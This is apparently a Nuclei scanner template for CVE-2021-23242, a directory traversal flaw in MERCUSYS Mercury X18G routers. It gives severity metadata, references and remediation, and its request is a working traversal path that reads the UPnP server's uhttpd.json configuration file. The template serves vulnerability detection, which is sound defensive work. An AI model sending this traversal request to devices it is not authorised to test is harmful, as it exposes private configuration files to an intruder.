id: CVE-2021-23242

info:
  name: MERCUSYS Mercury X18G Directory Traversal
  author: ProjectDiscoveryAI
  severity: medium
  description: MERCUSYS Mercury X18G 1.0.5 devices allow Directory Traversal via ../ to the UPnP server, as demonstrated by the /../../conf/template/uhttpd.json URI.
  impact: |
    An attacker can read sensitive files on the system.
  remediation: |
    Apply the vendor-supplied patch to mitigate the directory traversal vulnerability.
  reference:
    - https://github.com/BATTZION/MY_REQUEST/blob/master/Mercury%20Router%20Upnp%20Server%20Directory%20Traversal.md
    - https://github.com/AIoTPwn/SecurityAadvisories
    - https://github.com/ARPSyndicate/cvemon
    - https://github.com/pokerfacett/MY_CVE_CREDIT
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
    cvss-score: 5.3
    cve-id: CVE-2021-23242
    cwe-id: CWE-22
    epss-score: 0.00187
    epss-percentile: 0.57204
    cpe: cpe:2.3:o:mercusys:mercury_x18g_firmware:1.0.5:*:*:*:*:*:*:*
  metadata:
    vendor: mercusys
    product: mercury_x18g_firmware

http:
  - method: GET
    path:
      - "{{BaseURL}}/../../conf/template/uhttpd.json"

    matchers:
      - type: word
        words:
          - "uhttpd"
        part: body
